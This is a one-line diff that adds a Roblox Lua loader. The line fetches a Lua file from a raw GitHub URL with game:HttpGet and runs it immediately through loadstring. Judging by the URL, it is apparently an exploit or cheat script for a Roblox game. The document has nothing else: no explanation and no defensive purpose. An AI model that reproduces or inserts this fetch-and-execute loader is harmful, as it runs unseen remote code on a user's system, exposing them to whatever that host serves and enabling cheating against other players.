@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/pt-2-build-the-pyramid-spam0-5ufbo1q2obu83d.lua"))()
